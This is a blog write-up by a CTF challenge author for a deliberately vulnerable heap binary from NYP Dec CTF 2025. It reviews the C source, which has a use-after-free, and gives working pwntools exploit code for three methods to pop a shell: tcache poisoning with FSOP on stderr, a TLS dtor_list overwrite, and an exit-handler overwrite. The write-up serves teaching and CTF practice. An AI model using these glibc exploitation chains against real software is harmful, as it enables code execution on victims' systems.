+++
date = '2025-12-31T17:36:25+08:00'
draft = true
title = 'NYP Dec CTF 2025 Labubu 3 different ways'
categories = ["writeup", "CTF"]
tags = ["heap", "pwn"]
+++

#### Introduction:

labubu labubu labubububububu labubu labewbew labbubu labubu labu labubu labububub

Labubu translation: I wrote a beginner challenge for NYP Dec CTF 2025. It is meant to be a simple introduction to **tcache poisoning** with a small twist to force solvers to be more creative.

#### Table of Contents:

1. Prerequisites.
1. Binary and source code review.
1. Exploit(s)

#### Prerequisites:

Go read this post on the basics of [tcache poisoning.](https://waheyy.github.io/post/liardancer/liardancerwriteup/)
The only difference here is since the binary has the **FULL RELRO** protection enabled, the binary's **Global Offset Table** (GOT) cannot be written to so we have to get creative with our write-what-where.

#### Source Code Review:

```C
#define MAX_LABUBU 0x10
#define LABUBU_SIZE 0x400

char *labubu_holder[MAX_LABUBU] = {0};
```

So here you can see that you can have 16 Labubus and each Labubu has a fixed size of 0x400 bytes.

```C
void make_labubu() {
  printf("idx?: ");
  int idx = get_int();
  if (idx >= MAX_LABUBU || idx < 0) {
    exit(1);
  }
  labubu_holder[idx] = malloc(LABUBU_SIZE);
  printf("Your labubu has been bought!\n");
}
```

`make_labubu()` allocates a chunk of size 0x400.

```C
void sell_labubu() {
  printf("Which labubu to sell...\n");
  int idx = get_int();
  if (idx >= MAX_LABUBU || idx < 0) {
    exit(1);
  }
  free(labubu_holder[idx]);
  printf("You monster...\n");
}
```
```
```


`sell_labubu()` frees a 0x400 byte chunk and you can see that I do not null the pointer so I have a dangling pointer that can be used in a Use-After-Free(UAF).


```C
void name_labubu() {
  printf("Which labubu to name: \n");
  int idx = get_int();
  if (idx >= MAX_LABUBU || idx < 0) {
    exit(1);
  }
  if (labubu_holder[idx] == NULL) {
    printf("There is no labubu there...\n");
    exit(1);
  }
  printf("Name your labubu\n");
  fgets(labubu_holder[idx], LABUBU_SIZE, stdin);
  printf("Your labubu has been named %s\n", labubu_holder[idx]);
}
```


`name_labubu()` lets you edit the 0x400 chunk. This lets me make use of the dangling pointer to edit memory.

```C
void admire_labubu() {
  printf("Which limited edition 24k gold matcha performative labubu do you "
         "want to admire?\n");
  int idx = get_int();
  if (idx >= MAX_LABUBU || idx < 0) {
    exit(1);
  }
  if (labubu_holder[idx] == NULL) {
    printf("There is no labubu there...\n");
    exit(1);
  }
  write(1, labubu_holder[idx], LABUBU_SIZE);
}
```

`admire_labubu()` lets you read whatever that 0x400 byte chunk is holding.

#### Exploit:

I will be going through my intended solve of the challenge before going into the other methods we can use. 

#### 1. First we need a heap leak, so we can bypass the [pointer mangling.](https://ir0nstone.gitbook.io/notes/binexp/heap/safe-linking)

Pointer mangling is a security feature added in glibc 2.32 to protect singly-linked lists. By mangling the forward pointer of the chunks it is harder to overwrite it. However it is easily bypassed.

So first we allocate a chunk and then free it and read it since we have a UAF.

```python
alloc(0) #one chunk allocated in heap.
free(0) #the chunk goes into tcache, the first 8 bytes becomes the forward pointer.
read(0) #now we can read it.
heapleak = p.recvuntil(b"Welcome", drop=True)[:6]
heapleak = u64(heapleak.ljust(8, b"\x00"))
print(f"This is heap leak: {hex(heapleak)}")
```

This makes it so that there is one chunk in tcache and once a chunk goes into tcache the first 8 bytes of the data section of chunk becomes the forward pointer. Since this chunk is the only chunk in the tcache its forward pointer is **NULL** and following the pointer mangle formula. 

**fd = (chunk address >> 12) ^ next chunk** 

If next chunk is **NULL** then the fd stored inside the chunk will be **(chunk_address >> 12) ^ NULL** which gives me `chunk_address >> 12` which is exactly what I need in a heap leak.

#### 2. We now need a Libc leak.

Usually to get a Libc leak in heap challenges, we have to make use of a technique called the **unsorted leak**. The unsorted leak makes use of the fact that the first chunk to go into the unsorted bin has its fd and bk pointing into the Libc and then we can read it for the leak.


So to get a libc leak, we allocate a chunk that goes into the unsorted bin and free it. Once freed we can read it back and take the values which will point into `main_arena+96` inside Libc.

![gdb_main_arena_offsets](/post/labubu/images/gdb_main_arena_offsets.jpeg)

But if you try to do the same thing here, you will find a problem. Your chunks go straight into tcache and you cannot control the size, what do you do?????

Since tcache bins can only take 7 chunks, we can actually fill up the tcache with 7 chunks and once tcache is filled the chunks will be freed into unsorted and we can perform our Libc leak.

```python
for i in range(0, 9):
    alloc(i) #allocate 9 chunks. 7 chunks to fill, 1 chunk to free and last chunk for consolidation guard.

for i in range(0, 7):
    free(i) #free 7 chunks and now tcache is filled.

free(7) #here we free the chunk so it goes into unsorted bin.
read(7) #and now we can read the fd or bk to get the Libc leak.
libcleak = p.recvuntil(b"Welcome", drop=True)[:6]
libcleak = u64(libcleak.ljust(8, b"\x00"))
print(f"This is main_arena+96: {hex(libcleak)}")
main_arena_offset = 0x210ac0 + 96 #rmb to change this to the specific libc of the container
base = libcleak - main_arena_offset
print(f"This is libc base: {hex(base)}")
```

![main_arena_leak](/post/labubu/images/main_arena_leak.jpeg)

#### 3. Tcache poison and Method 1:

The intended method is to perform **FSOP** (file stream oriented programming). Since we the program ends with `exit()` we can find the address of `_IO_2_1_stderr_@@GLIBC_2.2.5` and use our tcache poison to overwrite it and when `exit()` is called and uses the file struct we gain code execution yay.

Now I will show you how i did my tcache poison.

```python
edit(2, p64(mangle(heapleak, stderr))) #change the fd of a freed chunk to stderr
alloc(13) # allocate chunks til I get my stderr struct back 
alloc(14)
alloc(15)
alloc(0)
alloc(1)
alloc(3) #this is my stderr struct back
```


Now we can edit `stderr` to be anything and we just pass in a stderr FSOP payload, exit and yay, we pop shell.

![fsopwin](/post/labubu/images/fsop_win.jpeg)

Here is my fsop payload.

```python
fs = FileStructure()
fs.flags = u64("  " + "sh".ljust(6, "\x00"))
fs._IO_write_base = 0
fs._IO_write_ptr = 1
fs._lock = stderr-0x10
fs.chain = system
fs._codecvt = stderr
fs._wide_data = stderr - 0x48
fs.vtable = io_wfile_jumps
```

#### Method 2:

Since I gave a 0x400 sized arbitrary write, you have a lot of options on how you want to pop the shell and we now we begin flexing on the challenge by solving it in other ways.

**Second method is a TLS-Storage dtor_list overwrite.**

When the program exits via `exit()` libc will execute `__run_exit_handlers()` which will call destructor functions (dtors) to cleanup before exiting. These functions are also mangled with the `PTR_MANGLE cookie` inside the **Thread Local Storage** (tls). 

So in order to overwrite the **dtor_list** we must first leak the address of **tls** and then erase or leak the `PTR_MANGLE cookie`. It is also at this time we realise using the arb-alloc to leak addresses is getting annoying as we have to tcache poison each time we want to leak something, so we upgrade to a true arbitrary read using `stdout`. 

![stdout_offset](/post/labubu/images/stdout_offset.jpeg)

```python 
def readmem(addr, size):
    temp = p64(0xfbad1887) + p64(0)*3 + p64(addr) + p64(addr+size)*3 + p64(addr+size+1)
    return temp

#since we have full control over the `stdout` struct we can overwrite it to give us a read.

```

Refer to [this](https://github.com/nobodyisnobody/docs/tree/main/using.stdout.as.a.read.primitive) for details on the `stdout` leak.

Now we can just repeatedly overwrite `stdout` to let us read anywhere we want as many times as we want, no need to tcache poison again and again YIPEE.

So first, we leak address of `__nptl_rtld_global` which holds the address of `_rtld_global`. 

```python
edit(3, readmem(rtld, 8))
rtld_leak = p.recvuntil(b"Your labubu", drop=True)
rtld_leak = u64(rtld_leak.ljust(8, b"\x00"))
print(f"this is _rtld_global {hex(rtld_leak)}")
initial_dtv = rtld_leak + 0xae8
print(f"this is initial_dtv {hex(intial_dvt)}")
edit(3, readmem(initial_dtv, 8))
tls_leak = p.recvuntil(b"Your labubu", drop=True)
tls_leak = u64(tls_leak.ljust(8, b"\x00")) - 0x9a0
print(f"this is tls leak {hex(tls_leak)}")

```

Now we have address of _rtld_global we can use the `initial_dtv` field inside `_rtld_global` as it holds a pointer into `tls` which has a constant offset to `tls` base so now equipped with the `tls` base address we can begin the overwriting.

Typing `p _rtld_global` in gdb (I use [bata24 gef](https://github.com/bata24/gef)) shows you the struct.

![initial_dtv](/post/labubu/images/initial_dtv.jpeg)

Something interesting of note is that the `dtor_list` is close to the `tls` so we can in one shot erase the `PTR_MANGLE cookie` and the `dtor_list`.

Here you can see the `tls` before the overwrite.

![before_tls_overwrite](/post/labubu/images/before_tls_overwrite.jpeg)

```python
target = tls_leak - 0x50
print(f"this is target {hex(target)}")
system_mangle = system << 17 #this is how the pointers are mangled

fake = p64(target+8)
fake += p64(system_mangle)
fake += p64(binsh)
fake += p64(0)*7
fake += p64(target+0x50) + p64(target+0x50+0x9a0) + p64(target+0x50)
fake += p64(0)*5
```

This is my payload.

And now we can perform another tcache poison and overwrite `tls` and then trigger the shell.

```python
free(0)
free(1)
edit(1, p64(mangle(heapleak, target)))
alloc(0)
alloc(1)
edit(1, fake)
p.sendline(b"5")
```

![after_tls_overwrite](/post/labubu/images/after_tls_overwrite.jpeg)


Here you can see that the `PTR_MANGLE cookie` is completely 0 now due to our overwrite. We also have our `dtor_list -> func` pointing to our `system()` and once called `system()` will take the thing below as its argument which is ever so conveniently `/bin/sh`. YIPEE!

![dtor_win](/post/labubu/images/dtor_win.jpeg)

Easy win. This method is overkill for this challenge as it requires you to have at least one more tcache poison and leak a lot of more addresses when just simple FSOP would have worked.

#### Method 3:

Overwriting exit handlers is the last reasonable method I have for this challenge. This method is also known as the `initial+24` overwrite method.

We still need a `tls` leak so we do the same thing as the dtor_list overwrite to get our leak.

This time our second tcache poison is to overwrite the `PTR_MANGLE cookie`.

```python
#second poison
free(0)
free(1)
edit(1, p64(mangle(heapleak, target))) #target is the address of PTR_MANGLE cookie
alloc(0)
alloc(1)
edit(1, p64(0))
```

![cookie_null](/post/labubu/images/cookie_null.jpeg)

Now we can inspect our `initial` struct which tells us that this program will exit with flavour **0x4** which is `ef_cxa` so we just have to overwrite the `cxa` entry in `initial` to `system()` and its arguments to `/bin/sh` and we win.

![before_initial_overwrite](/post/labubu/images/before_initial_overwrite.jpeg)

```python
libc = ELF("./libc.so.6")
initial_offset = libc.sym['initial'] + 16 #16 for alignment
initial = base + initial_offset
system = base + 0x000000000005c110
print(f"this is system {hex(system)}")
context.binary = libc = ELF("./libc.so.6")
binsh_offset = next(libc.search(b"/bin/sh"))
binsh = base + binsh_offset
print(f"this is binsh {hex(binsh)}")
print(f"this is initial+16 {hex(initial)}")
mangled_system = (system << 17)
print(f"this is mangled system {hex(mangled_system)}")
payload = p64(4) + p64(mangled_system) + p64(binsh)

#third poison
free(4)
free(0)
edit(0, p64(mangle(heapleak, initial)))
alloc(4)
alloc(0)
edit(0, payload)
p.sendline(b"5")

```

Here you can see that the function is overwritten to system.

![after_initial_overwrite](/post/labubu/images/after_initial_overwrite.jpeg)

We have to perform a third tcache poison to then overwrite the `initial` struct and then exit to trigger the exit handlers.

![exit_handlers_win](/post/labubu/images/exit_handlers_win.jpeg)

This method is even more inefficient as I have to tcache poison 3 times in total as well as get a **ton** more leaks. SO FOR THE SWEET LOVE OF GOD JUST USE FSOP. Thank you.

Stop using jippity to hallucinate answers for pwn!!!

[Here are the full scripts and files for this challenge.](https://github.com/Waheyy/challenges/tree/main/labubu)
